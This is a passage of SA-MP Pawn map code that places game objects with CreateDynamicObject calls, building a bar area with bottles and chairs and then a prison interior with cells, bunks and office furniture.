	CreateDynamicObject(1704,2798.16625977,2400.81250000,1239.53112793,0.00000000,0.00000000,179.24743652); //object(kb_chair03)(6)
	CreateDynamicObject(2109,2797.77148438,2402.70410156,1239.92224121,0.00000000,0.00000000,0.00000000); //object(low_dinning_3)(2)
	CreateDynamicObject(1704,2798.51025391,2409.59643555,1239.53112793,0.00000000,0.00000000,80.75000000); //object(kb_chair03)(7)
	CreateDynamicObject(1704,2802.27539062,2409.52099609,1239.53112793,0.00000000,0.00000000,254.99987793); //object(kb_chair03)(8)
	CreateDynamicObject(2109,2800.38696289,2409.66967773,1239.92224121,0.00000000,0.00000000,356.25000000); //object(low_dinning_3)(3)
	CreateDynamicObject(2800,2800.28247070,2409.56176758,1240.14521484,0.00000000,0.00000000,0.00000000); //object(castable2top)(1)
	CreateDynamicObject(2894,2803.68530273,2403.32006836,1240.34521484,0.00000000,0.00000000,0.00000000); //object(kmb_rhymesbook)(1)
	CreateDynamicObject(1543,2794.46435547,2411.56835938,1241.20043945,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(1)
	CreateDynamicObject(1543,2794.36425781,2411.56445312,1241.20043945,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(2)
	CreateDynamicObject(1543,2794.26464844,2411.56054688,1241.20043945,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(4)
	CreateDynamicObject(1543,2794.16503906,2411.55664062,1241.20043945,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(5)
	CreateDynamicObject(1543,2794.06542969,2411.55273438,1241.20043945,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(6)
	CreateDynamicObject(1543,2793.96679688,2411.52392578,1241.20043945,0.00000000,0.00000000,44.00000000); //object(cj_beer_b_2)(7)
	CreateDynamicObject(1517,2792.72436523,2411.60913086,1240.91137695,0.00000000,0.00000000,96.00000000); //object(dyn_wine_break)(1)
	CreateDynamicObject(1517,2790.34960938,2411.65405273,1240.91137695,0.00000000,0.00000000,95.99853516); //object(dyn_wine_break)(2)
	CreateDynamicObject(1517,2791.64892578,2411.62329102,1240.91137695,0.00000000,0.00000000,95.99853516); //object(dyn_wine_break)(3)
	CreateDynamicObject(1520,2792.24121094,2411.63623047,1240.76379395,0.00000000,0.00000000,268.25003052); //object(dyn_wine_bounce)(1)
	CreateDynamicObject(1520,2790.91162109,2411.68750000,1240.76379395,0.00000000,0.00000000,268.24768066); //object(dyn_wine_bounce)(2)
	CreateDynamicObject(1664,2789.24487305,2411.44165039,1241.37060547,0.00000000,0.00000000,76.00000000); //object(propwinebotl2)(1)
	CreateDynamicObject(1664,2789.08227539,2411.49707031,1241.37060547,0.00000000,0.00000000,75.99792480); //object(propwinebotl2)(4)
	CreateDynamicObject(1664,2788.92797852,2411.48291016,1241.37060547,0.00000000,0.00000000,75.99792480); //object(propwinebotl2)(5)
	CreateDynamicObject(1664,2788.76953125,2411.46923828,1241.37060547,0.00000000,0.00000000,75.99792480); //object(propwinebotl2)(6)
	CreateDynamicObject(1667,2797.80859375,2403.21606445,1240.43383789,0.00000000,0.00000000,0.00000000); //object(propwineglass1)(1)
	CreateDynamicObject(1667,2797.75976562,2402.12622070,1240.43383789,0.00000000,0.00000000,0.00000000); //object(propwineglass1)(2)
	CreateDynamicObject(1543,2795.78393555,2408.86035156,1240.57849121,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(8)
	CreateDynamicObject(1543,2793.28173828,2408.84179688,1240.57849121,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(9)
	CreateDynamicObject(1543,2788.47802734,2408.77514648,1240.57849121,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(10)
	CreateDynamicObject(1544,2789.54907227,2408.86914062,1240.57849121,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_1)(1)
	CreateDynamicObject(1544,2790.39624023,2408.71533203,1240.57849121,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_1)(2)
	CreateDynamicObject(1546,2794.76269531,2408.80566406,1240.66760254,0.00000000,0.00000000,0.00000000); //object(cj_pint_glass)(1)
	CreateDynamicObject(1548,2791.97314453,2408.82666016,1240.59082031,0.00000000,0.00000000,0.00000000); //object(cj_drip_tray)(1)
	CreateDynamicObject(1548,2794.80249023,2408.82958984,1240.59082031,0.00000000,0.00000000,0.00000000); //object(cj_drip_tray)(2)
	CreateDynamicObject(18650,2795.71875000,2411.61718750,1244.20742187,0.00000000,0.00000000,0.00000000); //object(gneon)(1)
	CreateDynamicObject(18650,2807.28515625,2399.69921875,1244.20739746,0.00000000,0.00000000,271.49963379); //object(gneon)(4)
	CreateDynamicObject(18885,2787.13037109,2389.61181641,1240.66625977,0.00000000,0.00000000,179.98596191); //object(locker)(4)


	//new prison
 	CreateDynamicObject(14412, -2065.75, -199.58, 999.88,   0.00, 0.00, 0.00);
	CreateDynamicObject(14408, -2063.84, -199.36, 987.18,   0.00, 0.00, 0.00);
	CreateDynamicObject(14416, -2086.50, -192.71, 991.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(14410, -2039.60, -200.71, 987.35,   0.00, 0.00, 0.00);
	CreateDynamicObject(14409, -2044.10, -202.51, 981.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(14407, -2076.37, -219.02, 974.64,   0.00, 0.00, 0.00);
	CreateDynamicObject(1534, -2057.82, -185.34, 979.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1498, -2097.08, -209.11, 994.69,   0.00, 0.00, 90.00);
	CreateDynamicObject(1498, -2097.11, -206.09, 994.69,   0.00, 0.00, 270.00);
	CreateDynamicObject(18045, -1829.48, -174.72, 1000.00,   0.00, 0.00, 0.00);
	CreateDynamicObject(14413, -2064.10, -192.86, 983.87,   0.00, 0.00, 0.00);
	CreateDynamicObject(14432, -2081.00, -192.84, 980.44,   0.00, 0.00, 0.00);
	CreateDynamicObject(14459, -2070.51, -199.60, 997.61,   0.00, 0.00, 0.00);
	CreateDynamicObject(14437, -2092.65, -222.01, 979.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(14440, -2072.21, -195.41, 996.62,   0.00, 0.00, 0.00);
	CreateDynamicObject(2633, -2059.99, -186.38, 982.55,   0.00, 0.00, 180.00);
	CreateDynamicObject(2633, -2055.87, -186.38, 982.55,   0.00, 0.00, 179.99);
	CreateDynamicObject(2949, -2054.15, -185.86, 984.18,   0.00, 0.00, 0.00);
	CreateDynamicObject(2949, -2053.70, -187.35, 984.18,   0.00, 0.00, 180.00);
	CreateDynamicObject(1508, -2078.38, -208.24, 972.47,   0.00, 0.00, 0.00);
	CreateDynamicObject(1523, -2059.38, -205.22, 977.82,   0.00, 0.00, 0.00);
	CreateDynamicObject(1523, -2056.34, -205.16, 977.82,   0.00, 0.00, 179.99);
	CreateDynamicObject(18762, -2054.86, -205.06, 978.76,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, -2054.33, -205.06, 978.76,   0.00, 0.00, 0.00);
	CreateDynamicObject(18766, -2059.85, -190.56, 981.76,   90.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2059.85, -200.56, 981.76,   90.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2056.34, -200.56, 981.76,   90.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2056.34, -190.56, 981.75,   90.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2061.85, -182.60, 981.48,   0.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2059.85, -187.10, 978.98,   0.00, 90.00, 179.99);
	CreateDynamicObject(18766, -2055.80, -187.10, 978.98,   0.00, 90.00, 179.99);
	CreateDynamicObject(18762, -2057.46, -205.06, 980.83,   0.00, 90.00, 0.00);
	CreateDynamicObject(18766, -2061.85, -200.56, 978.76,   0.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2061.85, -190.56, 978.76,   0.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2061.85, -182.60, 981.48,   0.00, 0.00, 270.00);
	CreateDynamicObject(18762, -2060.85, -205.06, 978.76,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, -2059.85, -205.06, 978.76,   0.00, 0.00, 0.00);
	CreateDynamicObject(18762, -2057.46, -205.06, 980.83,   0.00, 90.00, 0.00);
	CreateDynamicObject(18762, -2055.86, -205.06, 978.76,   0.00, 0.00, 0.00);
	CreateDynamicObject(18766, -2056.34, -190.56, 981.75,   90.00, 0.00, 270.00);
	CreateDynamicObject(18766, -2055.80, -187.10, 978.98,   0.00, 90.00, 179.99);
	CreateDynamicObject(18766, -2059.85, -187.10, 978.98,   0.00, 90.00, 179.99);
	CreateDynamicObject(2341, -2060.84, -188.11, 977.83,   0.00, 0.00, 90.00);
	CreateDynamicObject(2141, -2059.85, -188.10, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2134, -2060.84, -189.11, 977.83,   0.00, 0.00, 90.00);
	CreateDynamicObject(2419, -2058.48, -188.31, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2451, -2055.96, -188.29, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2132, -2060.84, -191.10, 977.83,   0.00, 0.00, 90.00);
	CreateDynamicObject(2133, -2060.84, -192.11, 977.83,   0.00, 0.00, 90.00);
	CreateDynamicObject(2340, -2060.84, -193.09, 977.83,   0.00, 0.00, 90.00);
	CreateDynamicObject(2131, -2060.84, -195.11, 977.83,   0.00, 0.00, 90.00);
	CreateDynamicObject(2339, -2060.85, -196.10, 977.83,   0.00, 0.00, 90.00);
	CreateDynamicObject(14464, -2074.09, -187.57, 987.10,   0.00, 0.00, 0.00);
	CreateDynamicObject(2930, -2039.70, -193.36, 993.68,   90.00, 180.00, 90.00);
	CreateDynamicObject(2930, -2092.79, -197.37, 980.98,   90.00, 179.99, 90.00);
	CreateDynamicObject(16501, -2077.93, -188.88, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2080.97, -190.23, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2071.79, -188.88, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2065.79, -188.88, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2059.79, -188.88, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2053.83, -188.88, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2053.82, -209.81, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2059.79, -209.81, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2065.76, -209.81, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2071.81, -209.81, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2077.80, -209.81, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2083.79, -209.81, 992.13,   0.00, 0.00, 0.00);
	CreateDynamicObject(16501, -2073.87, -190.23, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2066.77, -190.23, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2059.67, -190.23, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2052.57, -190.23, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2051.96, -208.47, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2059.06, -208.47, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2066.16, -208.47, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2073.26, -208.47, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2080.37, -208.47, 994.43,   0.00, 270.00, 270.00);
	CreateDynamicObject(16501, -2087.47, -208.47, 994.43,   0.00, 270.00, 270.05);
	CreateDynamicObject(16501, -2077.92, -192.33, 992.13,   0.00, 0.00, 270.00);
	CreateDynamicObject(16501, -2065.79, -192.33, 992.13,   0.00, 0.00, 270.00);
	CreateDynamicObject(16501, -2054.11, -192.33, 992.13,   0.00, 0.00, 270.00);
	CreateDynamicObject(16501, -2083.26, -206.36, 992.13,   0.00, 0.00, 90.00);
	CreateDynamicObject(16501, -2071.77, -206.36, 992.13,   0.00, 0.00, 90.00);
	CreateDynamicObject(16501, -2059.77, -206.36, 992.13,   0.00, 0.00, 90.00);
	CreateDynamicObject(1800, -2078.83, -193.27, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2078.83, -193.27, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2077.34, -193.27, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2077.34, -193.27, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2066.67, -193.28, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2066.67, -193.28, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2065.18, -193.30, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2065.18, -193.30, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2054.71, -193.27, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2054.71, -193.27, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2053.23, -193.31, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2053.23, -193.30, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2059.17, -210.00, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2059.17, -210.00, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2060.70, -209.98, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2060.70, -209.98, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2071.16, -209.97, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2071.16, -209.97, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2072.72, -209.96, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2072.72, -209.96, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2083.16, -209.97, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2083.16, -209.97, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2084.76, -209.98, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(1800, -2084.76, -209.98, 991.38,   0.00, 0.00, 0.00);
	CreateDynamicObject(2514, -2085.09, -212.59, 990.54,   0.00, 0.00, 180.00);
	CreateDynamicObject(2514, -2082.45, -212.59, 990.54,   0.00, 0.00, 179.99);
	CreateDynamicObject(2514, -2072.92, -212.59, 990.54,   0.00, 0.00, 179.99);
	CreateDynamicObject(2514, -2070.69, -212.58, 990.54,   0.00, 0.00, 179.99);
	CreateDynamicObject(2514, -2060.97, -212.60, 990.54,   0.00, 0.00, 179.99);
	CreateDynamicObject(2514, -2058.48, -212.58, 990.54,   0.00, 0.00, 179.99);
	CreateDynamicObject(2514, -2052.40, -186.11, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(2514, -2055.02, -186.11, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(2514, -2064.55, -186.11, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(2514, -2066.57, -186.12, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(2514, -2076.43, -186.11, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(2514, -2078.56, -186.09, 990.54,   0.00, 0.00, 0.00);
	CreateDynamicObject(2523, -2081.05, -186.12, 990.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(2523, -2075.04, -186.11, 990.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(2523, -2069.03, -186.11, 990.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(2523, -2063.04, -186.11, 990.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(2523, -2057.32, -186.11, 990.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(2523, -2051.16, -186.11, 990.51,   0.00, 0.00, 0.00);
	CreateDynamicObject(2523, -2055.92, -212.59, 990.51,   0.00, 0.00, 180.00);
	CreateDynamicObject(2523, -2062.24, -212.59, 990.51,   0.00, 0.00, 179.99);
	CreateDynamicObject(2523, -2068.18, -212.59, 990.51,   0.00, 0.00, 179.99);
	CreateDynamicObject(2523, -2074.32, -212.58, 990.51,   0.00, 0.00, 179.99);
	CreateDynamicObject(2523, -2079.83, -212.59, 990.51,   0.00, 0.00, 179.99);
	CreateDynamicObject(2523, -2086.35, -212.59, 990.51,   0.00, 0.00, 179.99);
	CreateDynamicObject(16501, -2090.76, -203.92, 998.24,   90.00, 180.00, 270.00);
	CreateDynamicObject(2607, -2038.54, -192.67, 990.93,   0.00, 0.00, 0.00);
	CreateDynamicObject(1806, -2038.42, -191.63, 990.54,   0.00, 0.00, 166.00);
	CreateDynamicObject(14772, -2037.83, -192.79, 991.53,   0.00, 0.00, 220.00);
	CreateDynamicObject(2607, -2091.63, -196.67, 978.23,   0.00, 0.00, 0.00);
	CreateDynamicObject(1806, -2091.77, -195.65, 977.83,   0.00, 0.00, 200.00);
	CreateDynamicObject(14772, -2090.92, -196.79, 978.82,   0.00, 0.00, 226.00);
	CreateDynamicObject(14433, -2072.19, -199.35, 985.69,   0.00, 0.00, 0.00);
	CreateDynamicObject(14438, -2072.16, -199.36, 987.67,   0.00, 0.00, 0.00);
	CreateDynamicObject(14439, -2064.12, -199.43, 997.98,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2047.64, -210.33, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2049.69, -210.34, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2047.64, -206.42, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2049.69, -206.42, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2047.64, -202.36, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2049.65, -202.36, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2047.64, -198.12, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2049.67, -198.12, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2047.64, -194.42, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(2637, -2049.64, -194.42, 978.24,   0.00, 0.00, 0.00);
	CreateDynamicObject(3657, -2048.58, -193.03, 978.35,   0.00, 0.00, 0.00);
	CreateDynamicObject(3657, -2048.62, -196.80, 978.35,   0.00, 0.00, 0.00);
	CreateDynamicObject(3657, -2048.60, -200.99, 978.35,   0.00, 0.00, 0.00);
	CreateDynamicObject(3657, -2048.60, -205.10, 978.35,   0.00, 0.00, 0.00);
	CreateDynamicObject(3657, -2048.62, -209.12, 978.35,   0.00, 0.00, 0.00);
	CreateDynamicObject(3657, -2048.65, -211.60, 978.35,   0.00, 0.00, 180.00);
	CreateDynamicObject(3657, -2048.62, -207.61, 978.35,   0.00, 0.00, 179.99);
	CreateDynamicObject(3657, -2048.61, -203.62, 978.35,   0.00, 0.00, 179.99);
	CreateDynamicObject(3657, -2048.67, -199.38, 978.35,   0.00, 0.00, 179.99);
	CreateDynamicObject(3657, -2048.63, -195.59, 978.35,   0.00, 0.00, 179.99);
	CreateDynamicObject(1985, -2064.15, -208.18, 981.12,   0.00, 0.00, 0.00);
	CreateDynamicObject(3675, -2064.16, -213.50, 982.36,   90.00, 0.00, 0.00);
	CreateDynamicObject(1985, -2064.16, -211.03, 981.12,   0.00, 0.00, 0.00);
	CreateDynamicObject(946, -2076.58, -209.76, 979.98,   0.00, 0.00, 0.00);
	CreateDynamicObject(946, -2076.65, -188.87, 979.98,   0.00, 0.00, 180.00);
	CreateDynamicObject(3065, -2077.07, -190.82, 977.97,   0.00, 0.00, 0.00);
	CreateDynamicObject(3065, -2075.34, -208.14, 977.97,   0.00, 0.00, 0.00);
	CreateDynamicObject(2628, -2083.45, -192.52, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2628, -2086.76, -192.49, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2629, -2083.64, -206.35, 977.83,   0.00, 0.00, 180.00);
	CreateDynamicObject(2629, -2086.65, -206.30, 977.83,   0.00, 0.00, 179.99);
	CreateDynamicObject(2915, -2083.38, -211.71, 978.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(2915, -2086.44, -211.72, 978.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(2913, -2084.10, -206.89, 978.82,   0.00, 90.00, 0.00);
	CreateDynamicObject(2913, -2087.12, -206.85, 978.82,   0.00, 90.00, 0.00);
	CreateDynamicObject(2632, -2083.58, -210.05, 977.88,   0.00, 0.00, 90.00);
	CreateDynamicObject(2632, -2086.65, -210.07, 977.88,   0.00, 0.00, 90.00);
	CreateDynamicObject(2627, -2069.44, -192.26, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2627, -2066.98, -192.25, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2627, -2066.99, -188.32, 977.83,   0.00, 0.00, 180.00);
	CreateDynamicObject(2627, -2069.48, -188.33, 977.83,   0.00, 0.00, 179.99);
	CreateDynamicObject(2630, -2069.59, -206.40, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2630, -2066.81, -206.41, 977.83,   0.00, 0.00, 0.00);
	CreateDynamicObject(2630, -2069.56, -210.49, 977.83,   0.00, 0.00, 180.00);
	CreateDynamicObject(2630, -2066.79, -210.46, 977.83,   0.00, 0.00, 179.99);
	CreateDynamicObject(2596, -2054.44, -211.62, 980.18,   0.00, 0.00, 270.00);
	CreateDynamicObject(1810, -2058.40, -211.89, 977.83,   0.00, 0.00, 100.00);
	CreateDynamicObject(1810, -2058.41, -210.71, 977.83,   0.00, 0.00, 82.00);
	CreateDynamicObject(1810, -2058.12, -209.71, 977.83,   0.00, 0.00, 78.00);
	CreateDynamicObject(1810, -2057.01, -210.42, 977.83,   0.00, 0.00, 79.99);
	CreateDynamicObject(1810, -2057.18, -211.45, 977.83,   0.00, 0.00, 87.99);
	CreateDynamicObject(1810, -2059.42, -209.14, 977.83,   0.00, 0.00, 71.99);
	CreateDynamicObject(1810, -2059.70, -210.07, 977.83,   0.00, 0.00, 93.99);
	CreateDynamicObject(1810, -2060.00, -211.06, 977.83,   0.00, 0.00, 99.98);
	CreateDynamicObject(1810, -2059.81, -212.18, 977.83,   0.00, 0.00, 95.98);
	CreateDynamicObject(14782, -2042.43, -189.35, 985.20,   0.00, 0.00, 270.00);
	CreateDynamicObject(2165, -2052.16, -202.85, 984.18,   0.00, 0.00, 90.00);
	CreateDynamicObject(2198, -2052.18, -196.85, 984.18,   0.00, 0.00, 90.00);
	CreateDynamicObject(2181, -2047.07, -195.83, 984.18,   0.00, 0.00, 270.00);
	CreateDynamicObject(2174, -2047.08, -199.84, 984.18,   0.00, 0.00, 270.00);
	CreateDynamicObject(2202, -2047.09, -204.23, 984.18,   0.00, 0.00, 270.00);
	CreateDynamicObject(3089, -1824.47, -179.19, 999.34,   0.00, 0.00, 0.00);
	CreateDynamicObject(3089, -1836.85, -177.65, 999.34,   0.00, 0.00, 270.00);
	CreateDynamicObject(2395, -1829.75, -169.92, 996.18,   0.00, 0.00, 270.00);
	CreateDynamicObject(2395, -1829.75, -173.65, 996.18,   0.00, 0.00, 270.00);
	CreateDynamicObject(2395, -1829.75, -177.38, 996.18,   0.00, 0.00, 270.00);
	CreateDynamicObject(2664, -1829.72, -170.61, 998.97,   90.00, 335.00, 25.00);
	CreateDynamicObject(2664, -1829.72, -172.96, 998.97,   90.00, 334.99, 25.00);
	CreateDynamicObject(2664, -1829.72, -175.32, 998.97,   90.00, 334.99, 25.00);
	CreateDynamicObject(2664, -1829.72, -177.67, 998.97,   90.00, 334.99, 25.00);
	CreateDynamicObject(2664, -1829.72, -180.03, 998.97,   90.00, 334.99, 25.00);
	CreateDynamicObject(2395, -1828.19, -172.68, 996.18,   0.00, 0.00, 90.00);
	CreateDynamicObject(2395, -1828.19, -176.41, 996.18,   0.00, 0.00, 90.00);
	CreateDynamicObject(2395, -1828.19, -180.14, 996.18,   0.00, 0.00, 90.00);
	CreateDynamicObject(14842, -2049.41, -211.55, 992.03,   0.00, 0.00, 180.00);
	CreateDynamicObject(14842, -2052.16, -212.23, 992.03,   0.00, 0.00, 90.00);
	CreateDynamicObject(5856, -2044.96, -213.08, 992.54,   0.00, 0.00, 270.00);
	CreateDynamicObject(2395, -1829.75, -169.92, 1000.35,   0.00, 0.00, 270.00);
	CreateDynamicObject(2395, -1828.18, -172.68, 1000.35,   0.00, 0.00, 90.00);
	CreateDynamicObject(2664, -1829.72, -170.60, 1000.42,   270.00, 180.08, 180.07);
	CreateDynamicObject(2664, -1829.72, -172.96, 1000.42,   270.00, 180.07, 180.07);
	CreateDynamicObject(2664, -1829.72, -175.31, 1000.42,   270.00, 180.07, 180.07);
	CreateDynamicObject(2664, -1829.72, -177.67, 1000.42,   270.00, 180.07, 180.07);
	CreateDynamicObject(2664, -1829.73, -180.03, 1000.42,   270.00, 180.07, 180.07);
	CreateDynamicObject(2395, -1829.75, -173.65, 1000.35,   0.00, 0.00, 270.00);
	CreateDynamicObject(2395, -1829.76, -177.39, 1000.35,   0.00, 0.00, 270.00);
	CreateDynamicObject(2395, -1828.18, -176.40, 1000.35,   0.00, 0.00, 90.00);
	CreateDynamicObject(2395, -1828.18, -180.14, 1000.35,   0.00, 0.00, 90.00);
	CreateDynamicObject(2604, -2089.59, -201.87, 995.50,   0.00, 0.00, 270.00);
	CreateDynamicObject(2604, -2089.59, -197.81, 995.50,   0.00, 0.00, 270.00);
	CreateDynamicObject(2604, -2089.59, -193.98, 995.50,   0.00, 0.00, 270.00);
	CreateDynamicObject(2608, -2096.79, -188.97, 996.21,   0.00, 0.00, 90.00);
	CreateDynamicObject(9362, -2091.35, -190.36, 995.45,   0.00, 0.00, 0.00);
	CreateDynamicObject(2204, -2094.45, -185.71, 994.70,   0.00, 0.00, 0.00);
	CreateDynamicObject(2199, -2096.19, -185.71, 994.70,   0.00, 0.00, 0.00);
	CreateDynamicObject(2161, -2097.01, -197.70, 994.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(2162, -2097.02, -197.70, 996.05,   0.00, 0.00, 90.00);
	CreateDynamicObject(2163, -2097.06, -199.47, 996.54,   0.00, 0.00, 90.00);
	CreateDynamicObject(2164, -2097.00, -199.47, 994.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(2167, -2097.01, -200.39, 994.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(2161, -2097.01, -196.37, 994.70,   0.00, 0.00, 90.00);
	CreateDynamicObject(1663, -2090.78, -193.22, 995.16,   0.00, 0.00, 76.00);
	CreateDynamicObject(1663, -2090.75, -197.19, 995.16,   0.00, 0.00, 114.00);
	CreateDynamicObject(1663, -2090.89, -201.25, 995.16,   0.00, 0.00, 95.99);
	CreateDynamicObject(16501, -2097.30, -203.92, 998.24,   90.00, 179.99, 270.00);
	CreateDynamicObject(16501, -2093.90, -203.92, 1000.92,   90.00, 179.99, 270.00);
	CreateDynamicObject(18001, -1829.00, -173.50, 999.68,   0.00, 0.00, 90.00);
	CreateDynamicObject(18001, -1829.00, -181.66, 999.68,   0.00, 0.00, 90.00);
	CreateDynamicObject(18001, -1829.04, -173.52, 999.68,   0.00, 0.00, 270.00);
	CreateDynamicObject(18001, -1829.04, -181.67, 999.68,   0.00, 0.00, 270.00);
	CreateDynamicObject(16500, -1827.91, -180.03, 1000.18,   0.00, 0.00, 90.00);
	CreateDynamicObject(1886, -1836.22, -179.26, 1002.00,   0.00, 0.00, 133.95);
	CreateDynamicObject(1886, -1822.65, -170.17, 1002.00,   0.00, 0.00, 309.95);
	CreateDynamicObject(2204, -2048.81, -185.68, 984.18,   0.00, 0.00, 0.00);
	CreateDynamicObject(2200, -2051.01, -185.71, 984.12,   0.00, 0.00, 0.00);
	CreateDynamicObject(1671, -2051.05, -196.19, 984.64,   0.00, 0.00, 286.00);
	CreateDynamicObject(1671, -2050.94, -202.43, 984.64,   0.00, 0.00, 258.00);
	CreateDynamicObject(1671, -2048.17, -196.20, 984.64,   0.00, 0.00, 73.99);
	CreateDynamicObject(16500, -2052.11, -205.82, 986.39,   90.00, 0.00, 270.00);
	CreateDynamicObject(16500, -2049.82, -205.81, 988.51,   0.00, 0.00, 270.00);
	CreateDynamicObject(1508, -2045.03, -185.57, 992.19,   0.00, 0.00, 90.00);
	CreateDynamicObject(971, -2084.14, -189.68, 997.98,   0.00, 0.00, 0.00);
	CreateDynamicObject(971, -2052.20, -138.10, 36.90,   0.00, 0.00, 180.00);
	CreateDynamicObject(971, -2052.20, -118.80, 36.90,   0.00, 0.00, 180.00);
	CreateDynamicObject(1363, -1829.50, -172.71, 998.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1363, -1829.51, -170.40, 998.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1363, -1829.50, -175.02, 998.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1363, -1829.51, -177.28, 998.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1363, -1828.44, -170.48, 998.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1363, -1828.44, -172.84, 998.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1363, -1828.44, -175.10, 998.05,   0.00, 0.00, 0.00);
	CreateDynamicObject(1363, -1828.44, -177.42, 998.05,   0.00, 0.00, 0.00);
